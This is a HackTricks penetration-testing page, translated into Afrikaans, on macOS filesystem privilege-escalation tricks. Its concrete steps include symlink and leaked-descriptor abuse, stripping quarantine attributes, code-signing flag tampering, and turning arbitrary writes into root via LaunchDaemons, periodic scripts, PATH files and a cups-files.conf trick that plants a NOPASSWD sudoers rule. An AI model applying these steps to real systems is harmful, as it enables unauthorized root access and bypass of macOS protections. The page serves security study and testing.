# macOS FS Tricks

{{#include ../../../../banners/hacktricks-training.md}}

## POSIX-toestemmingkombinasies

Vir ’n **gids** beteken die drie toestemmingsbisse iets anders as vir ’n gewone lêer. `chmod(1)` noem die execute-bis "**search**" wanneer dit op ’n gids toegepas word:<sup>[[2]](#references)</sup>

> `0100` Vir lêers, laat uitvoering deur die eienaar toe. Vir gidse, laat die eienaar toe om in die gids te **soek**.

- **read** - jy kan die gidsinskrywings **lys** (die name lys).
- **write** - jy kan inskrywings in die gids **skep, hernoem en uitvee**. Let daarop dat dit ’n eienskap van die *bevattende* gids is, nie van die lêer nie: jy kan ’n lêer uitvee wat jy nie kan lees of skryf nie, mits jy na sy ouergids kan skryf.
  - Om ’n **subgids** uit te vee, moet dit leeg wees; dit vereis weer genoeg regte om alles daarin te verwyder.
  - As die gids die **sticky bit** (`S_ISVTX`, soos `/tmp`) het, is dit beperk — POSIX bepaal dat ’n proses dan lêers daarin slegs kan verwyder of hernoem as dit die lêer of gids besit, of toepaslike voorregte het.<sup>[[1]](#references)</sup>
- **execute / search** - jy **mag deur die gids beweeg**. Padnaamresolusie vind elke komponent "in die gids wat deur sy voorganger gespesifiseer word", dus maak **verlies van soekregte op enige enkele komponent van die padvoorvoegsel alles daaronder onbereikbaar via die pad**, selfs al is die blaarlêer self vir almal leesbaar.<sup>[[1]](#references)</sup>

### Gevaarlike kombinasies

**Hoe om ’n lêer/vouer wat deur root besit word, te oorskryf**, maar:

- Een ouergids in die pad word deur die gebruiker besit
- Een ouergids in die pad word deur ’n **gebruikersgroep** met **skryftoegang** besit
- ’n **Groep** gebruikers het **skryftoegang** tot die **lêer**

Met enige van die vorige kombinasies kan ’n aanvaller ’n **sym/hard link** by die verwagte pad **inspuit** om ’n bevoorregte arbitrêre skryfbewerking te verkry.

### Spesiale geval: gids met R+X vir root

Dit volg direk uit die reël vir padnaamresolusie hierbo. As ’n **gids slegs R+X aan root toestaan**, is die lêers daarin vir almal anders *via die pad* onbereikbaar — maar die **lêers se eie toestemmingsbisse kan steeds permissief wees**. Die gids is die enigste hindernis.

Dus word enige primitief waarmee jy die lêer **uit daardie gids kan kry** — ’n bevoorregte proses wat ’n pad wat deur ’n aanvaller gekies is na ’n ligging skuif/hernoem/kopieer waardeur jy *kan beweeg* — ’n arbitrêre leesbewerking, sonder dat jy ooit die lêer se eie modus hoef te omseil:

```bash
# Reproduce the primitive locally
sudo mkdir -p /tmp/locked && sudo chmod 700 /tmp/locked
sudo sh -c 'echo secret > /tmp/locked/data.txt; chmod 644 /tmp/locked/data.txt'

ls -l /tmp/locked/data.txt   # Permission denied: cannot even stat through the directory
cat /tmp/locked/data.txt     # Permission denied

# The file itself is mode 644 - only the parent directory's search bit blocks you.
sudo ls -l /tmp/locked/
```

Soek na bevoorregte lêerverskuiwers (installeerders, logrotators, crash-/diagnostiese versamelaars, rugsteun- en “uitvoer”-funksies) wat ’n bronpad aanvaar van ’n gebruiker met minder voorregte.

## Symbolic Link / Hard Link

### Toegeeflike lêer/vouer

As ’n bevoorregte proses data skryf na ’n **lêer** wat deur ’n **gebruiker met minder voorregte beheer** kan word, of wat **voorheen deur ’n gebruiker met minder voorregte geskep** kon gewees het, kan die gebruiker dit bloot via ’n Symbolic of Hard link na ’n ander lêer **laat wys**, waarna die bevoorregte proses na daardie lêer sal skryf.

Kyk in die ander afdelings waar ’n aanvaller ’n **arbitrary write kan misbruik om voorregte te verhoog**.

### Open `O_NOFOLLOW`

Volgens [`open(2)`](https://keith.github.io/xcode-man-pages/open.2.html): *"As `O_NOFOLLOW` in die masker gebruik word en die teikenlêer wat aan `open()` deurgegee word ’n simboliese skakel is, sal `open()` misluk."* Slegs die **laaste** komponent word nagegaan — elke **intermediêre** komponent word steeds opgelos en gevolg. ’n Ontwikkelaar wat dus ’n skryfaksie met `O_NOFOLLOW` “beskerm” het, kan steeds aangeval word deur ’n simboliese skakel in enige **ouer-gids** van die teikenpad te plaas.<sup>[[3]](#references)</sup>

Dieselfde manbladsy dokumenteer die vlae wat dié gaping wel sluit:<sup>[[3]](#references)</sup>

- **`O_NOFOLLOW_ANY`** — *"as ... enige komponent van die pad wat aan `open()` deurgegee word ’n simboliese skakel is, sal `open()` misluk."*
- **`O_RESOLVE_BENEATH`** — *"as ... die gespesifiseerde padresolusie buite die gids wat met die fd geassosieer word, beweeg, sal `openat()` misluk."*

Andersins is die oorblywende maniere om middelpad-simboliese-skakel-omruilings te keer: `openat()` relatief tot ’n gids-FD wat jy reeds gevalideer het, of `realpath()` gevolg deur herbekragtiging.

## .fileloc

Lêers met die **`.fileloc`**-uitbreiding kan na ander toepassings of binaries wys, sodat die toepassing/binêre lêer uitgevoer word wanneer hulle oopgemaak word.\
Voorbeeld:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>URL</key>
    <string>file:///System/Applications/Calculator.app</string>
    <key>URLPrefix</key>
    <integer>0</integer>
</dict>
</plist>
```

## Lêerbeskrywers

### Leak FD (geen `O_CLOEXEC`)

As ’n oproep na `open` nie die vlag `O_CLOEXEC` gebruik nie, sal die lêerbeskrywer deur die kinderproses geërf word. Dus, as ’n bevoorregte proses ’n bevoorregte lêer oopmaak en ’n proses uitvoer wat deur die aanvaller beheer word, sal die aanvaller **die FD na die bevoorregte lêer erf**.

Die kanonieke voorbeeld is die **`DYLD_PRINT_TO_FILE` LPE in OS X 10.10** ([SektionEins](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html)):<sup>[[4]](#references)</sup>

- `dyld` het `DYLD_PRINT_TO_FILE=/path` in ag geneem, selfs in **beperkte (suid root)-binaries**, omdat daardie spesifieke veranderlike buite `processDyldEnvironmentVariable()` ontleed is.
- Dit het `open(loggingPath, O_WRONLY | O_CREAT | O_APPEND, 0644)` uitgevoer, en dus **’n root-besitte lêer by ’n arbitrêre pad geskep**.
- Die FD is **nooit toegemaak nie en het geen close-on-exec-vlag gehad nie**, dus het elke kind van die suid-binary ’n **skryfbare FD na ’n root-besitte lêer geërf**.
- Deur byvoorbeeld `DYLD_PRINT_TO_FILE=/etc/target suid_binary` uit te voer en daarna die geërfde FD-nommer in die kindproses te lees, kon arbitrêre skryfbewerkings as root op root-besitte lêers gedoen word; `fcntl(fd, F_SETFL, 0)` het selfs `O_APPEND` skoongemaak om oorskryf in plaas van byvoeging moontlik te maak.

Dieselfde patroon kom voor wanneer ’n bevoorregte proses ’n lêer oopmaak **voordat** dit iets uitvoer wat jy beheer (hulpmiddels, `crontab`-agtige redigeerders wat deur `$EDITOR` aangeroep word, log-/ontfoutingslêers wat vanaf ’n env-var-pad oopgemaak word...). Lys die FD’s wat jy geërf het met:

```bash
# From inside the child process
ls -l /dev/fd/
# or
lsof -p $$
```

Enigiets bo `2` wat na ’n lêer wys wat jy nie self kan oopmaak nie, is ’n arbitrary-write (of arbitrary-read) primitive.

## Vermy quarantine xattrs-truuks

### Verwyder dit

```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```

### uchg / uchange / uimmutable-vlag

As 'n lêer/vouer hierdie onveranderlike kenmerk het, sal dit nie moontlik wees om 'n xattr daarop te plaas nie

```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```

### Lêerstelsels sonder xattr-ondersteuning

Nie elke lêerstelsel wat macOS kan mount, stoor **extended attributes** oorspronklik nie. HFS+ en APFS doen dit; **FAT32, exFAT en (die meeste) NFS-mounts doen dit nie** — macOS boots dit na deur ’n **AppleDouble**-sy-lêer met die naam `._<filename>` te skryf ([The Eclectic Light Company](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)).<sup>[[5]](#references)</sup>

Dit is belangrik vir quarantine, want die xattr bly net behoue as dit werklik **na dieselfde volume geskryf en daarvandaan teruggelees** kan word:

```bash
# Check whether a mount point round-trips xattrs at all
xattr -w com.apple.quarantine "0081;00000000;test;" /Volumes/SOMEUSB/file
xattr -p com.apple.quarantine /Volumes/SOMEUSB/file
ls -a /Volumes/SOMEUSB/          # look for the ._file AppleDouble companion
```

As die volume later gelees word via ’n pad wat die `._`-metgesel ignoreer (of die metgesel verwyder word), kom die lêer **sonder ’n quarantine-vlag** aan — en ’n `.app` sonder quarantine is genoeg om uit die App Sandbox te ontsnap, soos bespreek in [macOS Sandbox Debug & Bypass](../macos-sandbox/macos-sandbox-debug-and-bypass/README.md#bypassing-quarantine-attribute).

### writeextattr-ACL en AppleDouble-quarantinegedrag

Sien [AppleDouble/ACL quarantine bypass reproduction](macos-appledouble-acl-quarantine-bypass.md) vir die `writeextattr`-ACL-voorbeeld, die `com.apple.acl.text` AppleDouble-meganisme, en die stappe vir die opstel en validering van die sidecar.

## Om handtekeningkontroles te omseil

### Om platform binaries-kontroles te omseil

Sommige sekuriteitskontroles kyk of die binary ’n **platform binary** is, byvoorbeeld om ’n verbinding met ’n XPC-diens toe te laat. Soos egter gedemonstreer in https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/, is dit moontlik om hierdie kontrole te omseil deur ’n platform binary (soos /bin/ls) te kry en die exploit via dyld in te spuit deur die omgewingsveranderlike `DYLD_INSERT_LIBRARIES` te gebruik.<sup>[[7]](#references)</sup>

### Om die vlae `CS_REQUIRE_LV` en `CS_FORCED_LV` te omseil

Dit is moontlik vir ’n binary wat uitgevoer word om sy eie vlae te verander en kontroles te omseil met kode soos:<sup>[[7]](#references)</sup>

```c
// Code from https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/
int pid = getpid();
NSString *exePath = NSProcessInfo.processInfo.arguments[0];

uint32_t status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
status |= 0x2000; // CS_REQUIRE_LV
csops(pid, 9, &status, 4); // CS_OPS_SET_STATUS

status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
NSLog(@"=====Inject successfully into %d(%@), csflags=0x%x", pid, exePath, status);
```



## Bypass Code Signatures

Bundles bevat die lêer **`_CodeSignature/CodeResources`**, wat die **hash** van elke enkele **lêer** in die **bundle** bevat. Let daarop dat die hash van CodeResources ook **ingebed is in die executable**, so ons kan ook nie daarmee peuter nie.

Daar is egter sommige lêers waarvan die signature nie nagegaan sal word nie. Hulle het die sleutel `omit` in die plist, soos:

```xml
<dict>
...
	<key>rules</key>
	<dict>
...
		<key>^Resources/.*\.lproj/locversion.plist$</key>
		<dict>
			<key>omit</key>
			<true/>
			<key>weight</key>
			<real>1100</real>
		</dict>
...
	</dict>
	<key>rules2</key>
...
		<key>^(.*/index.html)?\.DS_Store$</key>
		<dict>
			<key>omit</key>
			<true/>
			<key>weight</key>
			<real>2000</real>
		</dict>
...
		<key>^PkgInfo$</key>
		<dict>
			<key>omit</key>
			<true/>
			<key>weight</key>
			<real>20</real>
		</dict>
...
		<key>^Resources/.*\.lproj/locversion.plist$</key>
		<dict>
			<key>omit</key>
			<true/>
			<key>weight</key>
			<real>1100</real>
		</dict>
...
</dict>
```

Dit is moontlik om die handtekening van ’n hulpbron vanaf die CLI te bereken met:

```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```

## Monteer dmgs

'n Gebruiker kan 'n pasgemaakte dmg monteer, selfs bo-op sommige bestaande vouers. Só kan jy 'n pasgemaakte dmg-pakket met pasgemaakte inhoud skep:

```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```

Gewoonlik monteer macOS skywe deur met die `com.apple.DiskArbitrarion.diskarbitrariond` Mach-diens (verskaf deur `/usr/libexec/diskarbitrationd`) te kommunikeer. As jy die parameter `-d` by die LaunchDaemons plist-lêer voeg en dit herbegin, sal dit logs in `/var/log/diskarbitrationd.log` stoor; dit sal logs stoor.\
Dit is egter moontlik om nutsgoed soos `hdik` en `hdiutil` te gebruik om direk met die `com.apple.driver.DiskImages` kext te kommunikeer.

## Willekeurige skryfbewerkings

### Periodieke sh-skripte

As jou skrip as ’n **shell script** geïnterpreteer kan word, kan jy die **`/etc/periodic/daily/999.local`** shell script oorskryf, wat daagliks geaktiveer sal word.

Jy kan die uitvoering van hierdie skrip **namaak** met: **`sudo periodic daily`**

### Daemons

Skryf ’n willekeurige **LaunchDaemon**, soos **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`**, met ’n plist wat ’n willekeurige skrip uitvoer, soos:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
    <dict>
        <key>Label</key>
        <string>com.sample.Load</string>
        <key>ProgramArguments</key>
        <array>
            <string>/Applications/Scripts/privesc.sh</string>
        </array>
        <key>RunAtLoad</key>
        <true/>
    </dict>
</plist>
```

Genereer net die script `/Applications/Scripts/privesc.sh` met die **commands** wat jy as root wil uitvoer.

### Sudoers-lêer

As jy **arbitrary write** het, kan jy ’n lêer in die vouer **`/etc/sudoers.d/`** skep wat jou **sudo**-privileges gee.

### PATH-lêers

Die lêer **`/etc/paths`** is een van die hoofplekke wat die PATH-omgewingsveranderlike vul. Jy moet root wees om dit te oorskryf, maar as ’n script van ’n **bevoorregte proses** ’n **command sonder die volledige pad** uitvoer, kan jy dit dalk **hijack** deur hierdie lêer te wysig.

Jy kan ook lêers in **`/etc/paths.d`** skryf om nuwe vouers in die PATH-omgewingsveranderlike te laai.

### cups-files.conf

Hierdie tegniek is in [hierdie writeup](https://www.kandji.io/blog/macos-audit-story-part1) gebruik.<sup>[[8]](#references)</sup>

Skep die lêer `/etc/cups/cups-files.conf` met die volgende inhoud:

```
ErrorLog /etc/sudoers.d/lpe
LogFilePerm 777
<some junk>
```

Dit sal die lêer `/etc/sudoers.d/lpe` met toestemmings 777 skep. Die ekstra gemors aan die einde is om die skepping van die foutlogboek te aktiveer.

Skryf dan die nodige konfigurasie in `/etc/sudoers.d/lpe` om voorregte te eskaleer, soos `%staff ALL=(ALL) NOPASSWD:ALL`.

Wysig daarna weer die lêer `/etc/cups/cups-files.conf` en dui `LogFilePerm 700` aan, sodat die nuwe sudoers-lêer geldig word wanneer `cupsctl` aangeroep word.

### Sandbox Escape

Dit is moontlik om uit die macOS-sandbox te ontsnap met ’n arbitrêre FS-skryfaksie. Kyk na die bladsy [macOS Auto Start](../../../../macos-auto-start-locations.md) vir ’n paar voorbeelde, maar ’n algemene metode is om ’n Terminal-voorkeurlêer in `~/Library/Preferences/com.apple.Terminal.plist` te skryf wat ’n opdrag met opstart uitvoer, en dit met `open` aan te roep.

## Genereer skryfbare lêers as ander gebruikers

’n Baie algemene privesc-primitief is om ’n **bevoorregte proses ’n lêer vir jou te laat skep** in ’n gids wat jy beheer, en dan **skryftoegang** tot daardie lêer te behou. Twee dinge is nodig:

1. ’n Gids wat jy besit (of waarin jy ’n **oorerfbare ACL** kan stel), sodat enigiets wat daarin geskep word jou toestemmings erf.
2. ’n Bevoorregte/`suid`-proses wat aangesê kan word **waar** om ’n lêer te skep — gewoonlik deur ’n debug-/logging-omgewingsveranderlike, ’n konfigurasielêer of ’n helper se XPC-API.

Die **oorerfbare ACL**-deel maak die geskepte lêer deur jou skryfbaar, al word dit deur ’n ander gebruiker besit. Die oorerwingsvlae `file_inherit` / `directory_inherit` word in [`chmod(1)`](https://keith.github.io/xcode-man-pages/chmod.1.html) gedokumenteer:<sup>[[2]](#references)</sup>

```bash
DIRNAME=/tmp/inherit_test
mkdir -p "$DIRNAME"

# file_inherit + directory_inherit => everything created inside is writable by me
chmod +a "$(whoami) allow read,write,append,execute,readattr,writeattr,readextattr,writeextattr,chown,delete,writesecurity,readsecurity,list,search,add_file,add_subdirectory,delete_child,file_inherit,directory_inherit" "$DIRNAME"

ls -lde "$DIRNAME"   # confirm the ACE is present
```

Nou is enige lêer wat ’n bevoorregte proses binne `$DIRNAME` skep **skryfbaar deur jou**. As daardie gids ook ’n plek is waaruit later **as root uitgevoer word** (`/etc/periodic/*`, `/etc/cron.d`, `/etc/sudoers.d`, ’n LaunchDaemon-gids...), lei dit direk tot root-eskalasie. Sien die afdelings [Sudoers File](#sudoers-file) en [cups-files.conf](#cups-filesconf) hierbo vir wat om te skryf sodra jy die lêer het.

Sien [Leak FD (no `O_CLOEXEC`)](#leak-fd-no-o_cloexec) hierbo vir ’n volledige uitgewerkte voorbeeld van die ketting: “’n omgewingsveranderlike laat ’n root-proses ’n lêer skep, en die FD lek na jou”.

## POSIX-gedeelde geheue

**POSIX-gedeelde geheue** laat prosesse in POSIX-voldoende bedryfstelsels toe om toegang tot ’n gemeenskaplike geheue-area te verkry, wat vinniger kommunikasie moontlik maak as ander metodes vir interproseskommunikasie. Dit behels die skep of oopmaak van ’n gedeelde geheue-objek met `shm_open()`, die instel van die grootte daarvan met `ftruncate()`, en die kartering daarvan in die proses se adresruimte met `mmap()`. Prosesse kan dan direk uit hierdie geheue-area lees en daarin skryf. Om gelyktydige toegang te bestuur en datakorrupsie te voorkom, word sinchronisasiemeganismes soos mutexes of semafore dikwels gebruik. Uiteindelik ontkoppel en sluit prosesse die gedeelde geheue met `munmap()` en `close()`, en verwyder opsioneel die geheue-objek met `shm_unlink()`. Hierdie stelsel is besonder doeltreffend vir vinnige IPC in omgewings waar verskeie prosesse vinnig toegang tot gedeelde data moet verkry.

<details>

<summary>Voorbeeld van produsentkode</summary>

```c
// gcc producer.c -o producer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
    const char *name = "/my_shared_memory";
    const int SIZE = 4096; // Size of the shared memory object

    // Create the shared memory object
    int shm_fd = shm_open(name, O_CREAT | O_RDWR, 0666);
    if (shm_fd == -1) {
        perror("shm_open");
        return EXIT_FAILURE;
    }

    // Configure the size of the shared memory object
    if (ftruncate(shm_fd, SIZE) == -1) {
        perror("ftruncate");
        return EXIT_FAILURE;
    }

    // Memory map the shared memory
    void *ptr = mmap(0, SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
    if (ptr == MAP_FAILED) {
        perror("mmap");
        return EXIT_FAILURE;
    }

    // Write to the shared memory
    sprintf(ptr, "Hello from Producer!");

    // Unmap and close, but do not unlink
    munmap(ptr, SIZE);
    close(shm_fd);

    return 0;
}
```

</details>

<details>

<summary>Voorbeeld van verbruikerskode</summary>

```c
// gcc consumer.c -o consumer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
    const char *name = "/my_shared_memory";
    const int SIZE = 4096; // Size of the shared memory object

    // Open the shared memory object
    int shm_fd = shm_open(name, O_RDONLY, 0666);
    if (shm_fd == -1) {
        perror("shm_open");
        return EXIT_FAILURE;
    }

    // Memory map the shared memory
    void *ptr = mmap(0, SIZE, PROT_READ, MAP_SHARED, shm_fd, 0);
    if (ptr == MAP_FAILED) {
        perror("mmap");
        return EXIT_FAILURE;
    }

    // Read from the shared memory
    printf("Consumer received: %s\n", (char *)ptr);

    // Cleanup
    munmap(ptr, SIZE);
    close(shm_fd);
    shm_unlink(name); // Optionally unlink

    return 0;
}

```

</details>

## macOS-bewaakte lêerbeskrywers

**macOS-bewaakte lêerbeskrywers** is ’n sekuriteitsfunksie wat in macOS bekendgestel is om die veiligheid en betroubaarheid van **lêerbeskrywerbewerkings** in gebruikertoepassings te verbeter. Hierdie bewaakte lêerbeskrywers bied ’n manier om spesifieke beperkings of “bewakings” aan lêerbeskrywers te koppel, wat deur die kern afgedwing word.

Hierdie funksie is veral nuttig om sekere soorte sekuriteitskwesbaarhede, soos **ongemagtigde lêertoegang** of **resiesituasies**, te voorkom. Hierdie kwesbaarhede ontstaan byvoorbeeld wanneer ’n draad toegang tot ’n lêerbeskrywing kry en dit **aan ’n ander kwesbare draad beskikbaar stel**, of wanneer ’n lêerbeskrywer deur ’n kwesbare kindproses **geërf** word. Sommige funksies wat met hierdie funksionaliteit verband hou, is:

- `guarded_open_np`: Maak ’n lêerbeskrywer met ’n bewaking oop
- `guarded_close_np`: Maak dit toe
- `change_fdguard_np`: Verander bewakingsvlaggies op ’n lêerbeskrywer (en verwyder selfs die bewakingsbeskerming)

## References

- [1] [POSIX.1-2024 — Basisdefinisies, Hoofstuk 4 (Lêertoegangstoestemmings, Gidsbeskerming, Padnaamresolusie)](https://pubs.opengroup.org/onlinepubs/9799919799/basedefs/V1_chap04.html)
- [2] [`chmod(1)`-manbladsy](https://keith.github.io/xcode-man-pages/chmod.1.html) (directory search/execute bit, ACL inheritance flags)
- [3] [`open(2)`-manbladsy](https://keith.github.io/xcode-man-pages/open.2.html) (`O_NOFOLLOW`, `O_NOFOLLOW_ANY`, `O_RESOLVE_BENEATH`)
- [4] [SektionEins - OS X 10.10 DYLD_PRINT_TO_FILE Plaaslike Regte-eskalasie](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html) (leaked FD without close-on-exec)
- [5] [The Eclectic Light Company - Watter lêerstelsels en wolkdienste bewaar uitgebreide eienskappe?](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)
- [7] [Mickey (Jhftss) - ’n Nuwe Era van macOS-sandbox-ontsnappings](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)
- [8] [Kandji - Onthulling van Apple-kwesbaarhede: Die ouditverhaal van diskarbitrationd en storagekitd, Deel 1](https://www.kandji.io/blog/macos-audit-story-part1)
{{#include ../../../../banners/hacktricks-training.md}}
